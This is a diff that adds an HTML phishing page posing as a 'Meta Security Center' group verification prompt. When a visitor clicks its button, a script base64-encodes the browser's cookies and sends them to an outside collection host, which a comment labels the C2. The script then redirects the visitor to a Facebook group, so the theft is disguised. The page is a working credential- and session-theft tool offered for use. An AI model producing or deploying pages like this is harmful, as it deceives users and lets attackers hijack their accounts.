@@ -1,1 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Security Center - Group Verification</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 100%; }
+        h2 { color: #1c1e21; margin-bottom: 20px; }
+        p { color: #606770; margin-bottom: 30px; }
+        button { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Security Verification</h2>
+        <p>To ensure the safety of your group, please verify your administrative session.</p>
+        <button onclick="captureAndRedirect()">Verify Administrative Status</button>
+    </div>
 
+    <script>
+        function captureAndRedirect() {
+            // Exfiltrate data to your C2
+            const data = btoa(document.cookie);
+            fetch('https://data-receiver-eta.vercel.app/api/log?c=' + data);
+            
+            // Redirect to group after slight delay
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/groups/1745548953421835";
+            }, 500);
+        }
+    </script>
+</body>
+</html>
